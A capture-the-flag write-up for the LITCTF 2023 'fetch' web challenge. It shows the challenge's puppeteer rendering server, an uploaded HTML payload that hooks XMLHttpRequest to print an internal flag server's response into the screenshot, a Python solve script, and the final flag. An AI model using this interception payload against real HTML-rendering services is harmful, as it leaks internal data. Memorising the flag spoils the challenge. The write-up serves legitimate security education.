# Web - fetch (LITCTF 2023)

## Problem

We are given the following `index.js` file on port 4242:

```js
import puppeteer from "puppeteer";
import { randomString, startFlagServer } from "./flag_server";
import express from "express";
import fileUpload from "express-fileupload";
import fs from "fs";

const runHTMLFile = async (filePath) => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(`file:${filePath}`);

  await page.evaluate(() => {
    const req = new window.XMLHttpRequest();
    req.open("GET", "http://localhost:6969/" + randomString, false);
    req.send(null);
  });
  const screenshot = await page.screenshot({
    path: filePath.replace(".html", ".png"),
    fullPage: true,
    type: "png",
  });
  await browser.close();

	return filePath.replace(".html", ".png");
};

const app = express();
app.use(fileUpload());
const port = 4242;
app.get("/", (req, res) => res.sendFile("index.html"));
app.get("/runHTML", async (req, res) => {
	// takes html file upload, saves it to "/uploads" + random string .html, runs it with the runHTMLFile function, and returns the screenshot
	const file = req.files.file;
	if (!file) {
		res.status(400).send("No file uploaded");
		return;
	}
	if (!file.mimetype.includes("html")) {
		res.status(400).send("File is not HTML");
		return;
	}

	const filePath = `/uploads/${Math.random().toString(36).substring(7)}.html`;
	fs.writeFileSync(filePath, file.data);
	const outputFilePath = runHTMLFile(filePath);
	res.sendFile(outputFilePath);
	// delete the files
	fs.rmSync(filePath);
	fs.rmSync(outputFilePath);
});

app.get('/sus.js', (req, res) => res.sendFile('sus.js'))

app.listen(port, () => console.log(`app listening on port ${port}!`));
startFlagServer();
```

Note that the flag server is running on port 6969:

```js
import express from "express";

const app = express();
const port = 6969;
export const randomString = Math.random().toString(36).substring(7);
app.get("/" + randomString, (req, res) => res.sendFile("flag.txt"));
export const startFlagServer = () =>
  app.listen(port, "127.0.0.1", () =>
    console.log(`flag server listening on port ${port}!`)
  );
```

We are also given the following hints in `sus.js`:
```
("big hints: headless browser with your file");
("gets flag from server");
("what can you do to intercept this?");
```

## Solution

As the hint suggests, our main objective is to intercept the AJAX request made to the flag server (`http://localhost:6969`) in the `runHTMLFile` function, i.e.:

```js
await page.evaluate(() => {
    const req = new window.XMLHttpRequest();
    req.open("GET", "http://localhost:6969/" + randomString, false);
    req.send(null);
  });
```

Some searching online rovides the following mechanism to overwrite the functionality of `XMLHttpRequest.prototype.open` upon receiving a response. This is in `fetchsolvehtml.html` for use in my solve script:

```html
<html>
    <script>
        // https://gilfink.medium.com/quick-tip-creating-an-xmlhttprequest-interceptor-1da23cf90b76
        let oldXHROpen = window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
            this.addEventListener('load', function() {
                document.write(this.responseText);
            });        
            return oldXHROpen.apply(this, arguments);
        }
    </script>
</html>
```

Once this is done, the server returns a screenshot of the webpage that now contains the flag after performing `document.write(this.responseText);` above. A solve script to finish this is as follows:

```python
import requests

url = 'http://litctf.org:31770'

r = requests.post(url + '/runHTML', files = {'file': ('file.html', open('fetchsolvehtml.html', 'rb').read(), 'text/html')})
print(r.status_code)
with open('fetch_response.png', 'wb') as f:
    f.write(r.content)
```

## Flag

LITCTF{wow_i_actually_love_the_fetch}
